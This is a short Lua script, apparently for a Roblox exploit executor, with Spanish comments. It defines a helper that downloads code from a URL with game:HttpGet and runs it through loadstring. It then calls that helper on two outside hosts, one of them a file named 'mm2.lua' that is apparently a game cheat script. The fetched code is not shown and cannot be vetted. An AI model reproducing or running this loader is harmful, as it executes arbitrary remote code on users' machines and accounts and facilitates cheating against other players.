
local function ejecutar(url)
    local ok, err = pcall(function()
        local codigo = game:HttpGet(url)
        local fn, errorCompilacion = loadstring(codigo)

        assert(fn, errorCompilacion or "Error de compilación")
        fn()
    end)

    if not ok then
        warn("Error: " .. tostring(err))
    end
end

-- Script principal
ejecutar("https://botthepan.onrender.com/script/c645f63d4c394b1c")

-- Segundo script
ejecutar("https://ryshub.xyz/scripts/mm2.lua")
